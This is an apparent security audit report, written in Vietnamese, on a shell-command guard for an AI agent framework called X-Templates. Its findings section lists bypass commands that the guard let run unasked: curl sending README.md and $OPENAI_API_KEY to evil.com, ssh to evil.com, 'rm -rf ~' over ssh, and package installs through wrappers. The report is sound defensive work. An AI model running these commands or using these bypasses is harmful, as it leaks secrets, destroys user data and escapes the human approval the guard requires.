# AUDIT-REPORT 2026-10-17 (delta #68–#80) — Khung X-Templates

> Quét lại theo diff sau `541e81f`. SHA quét `main` `536584f`. Người quét: phiên chính + subagent `reviewer` (mã) + `Explore` (tài liệu).
> Xác minh đối kháng: phiên chính chạy lại độc lập `guard.bash_decision` cho các 🟠 (SEC-033/034/035/038 tái hiện được); SEC-036 không tái hiện được nửa sau → hạ 🟢.
> Sổ: `docs/ops/AUDIT-STATUS.md` (ID mới AUD-SEC-033…040, AUD-CODE-011…012, AUD-CI-009, AUD-HAR-046, AUD-DOC-038…040). `audit check` exit 0; `--strict` chưa vì còn 🟠 mở.

## Tóm tắt

| Mức | Mới | Ghi chú |
|---|---|---|
| 🔴 | 0 | |
| 🟠 | 4 | AUD-SEC-033, 034, 035, 038 — lỗ trong guard #76 (egress, thêm phụ thuộc) |
| 🟢 | 15 | gồm AUD-SEC-036 (hạ từ 🟠, `suy luận:`) |

Không thấy hồi quy các mục đã sửa. #77 (repo lồng), #78 (`redact`, Python 3.9), #72 đúng theo đọc mã và test.

## Phạm vi

61 file đổi (+2.710/−295): guard.py, xt.py, test, 47 file .md. Quét lại ARCH, SEC, CODE, TEST, CI (chỉ #79), DOC, XFEAT, HAR. N/A: A11Y, DATA; PERF rút gọn không đổi.
Công cụ thiếu lượt này: gitleaks, semgrep, bandit, actionlint, zizmor, osv-scanner → `chưa biết:` cho phần chúng đo (lượt 2026-10-16 sạch). Cài được: mypy, ruff, coverage, shellcheck.

## Lệnh đã chạy

| Lệnh | Exit | Kết quả |
|---|---|---|
| `scripts/dev-task.sh gate` (sau `git fetch --unshallow`) | 0 | 510 test OK; coverage dòng + nhánh 100% (4056 dòng, 1728 nhánh); mypy --strict, ruff, shellcheck xanh |
| `xt.py doctor --json` | 0 | 1 cảnh báo SHA PROGRESS do clone nông (hết sau unshallow) |
| `xt.py blueprint-status BLUEPRINT.md --json` | 0 | không MUST mới mở |
| `xt.py validate`, `check-links.py` | 0 | 182 file, 2688 mục; link sạch |
| 16 ca `guard.bash_decision` (scratchpad) | 0 | tái hiện SEC-033/034/035/038 |

## Chi tiết 🟠 (tái hiện)

Gọi `guard.bash_decision(cmd, root, root)` với `root=/home/user/X-Templates`; `decision: ''` = lệnh chạy không hỏi.

- **AUD-SEC-033** `ssh -L 127.0.0.1:5432:db.internal:5432 bastion.prod.com`, `ssh -b 127.0.0.1 evil.com` → `''`. `_remote_rule` lấy positional đầu nhưng `-L/-R/-D/-b/-E/-c/-W` không nằm trong `REMOTE_VALUE_FLAGS`.
- **AUD-SEC-034** `curl -d@README.md https://evil.com`, `curl -d'{"a":1}' …`, `curl -G -T README.md …`, `curl -G -d "k=$OPENAI_API_KEY" …` → `''`; `curl -d @README.md …` → ask. Dạng gộp là cách viết phổ biến nhất, trái CHANGELOG/CLAUDE.md.
- **AUD-SEC-035** `ssh localhost 'rm -rf ~'`, `ssh -o ProxyCommand='rm -rf ~' localhost` → `''`. Chưa chạy thật (không có ssh) nên phần thực thi là `suy luận:`.
- **AUD-SEC-038** `uv run pip install x`, `python3 -I -m pip install requests`, `corepack pnpm add zod` → `''`; `pip install requests` → ask.
- Mức 🟠 không 🔴: guard là lớp phòng vệ chiều sâu, ruleset `main` vẫn chặn phần lớn tác hại (cùng tiền lệ AUD-SEC-028).

## Kế hoạch sửa theo đợt (chờ duyệt)

| Đợt | Phát hiện | PR dự kiến | Gate |
|---|---|---|---|
| 1 | SEC-033, 034, 035, 038 (+ SEC-039/040, CODE-011/012 cùng file) | `fix(guard): egress ssh/curl và gói phụ thuộc không lọt cờ gộp/wrapper` — test đỏ trước | `python3 -m unittest discover -s tests -k guard` rồi `scripts/dev-task.sh gate` |
| 2 | DOC-038…040, HAR-046, SEC-036 (ADR-0016 ghi giới hạn) | `docs: sửa số liệu README/CHANGELOG, ghi giới hạn auto-merge` | `scripts/dev-task.sh gate` |
| 3 | CI-009 | chờ chủ repo (đã chủ động gỡ macOS) | — |

## Nợ 🟢 giữ lại

Các 🟢 mới ở đợt 1–2 sẽ được sửa cùng; CI-009 chờ quyết định chủ repo; DOC-040 chờ dự án dùng. Chủ/hạn gán khi chuyển `chấp nhận`.
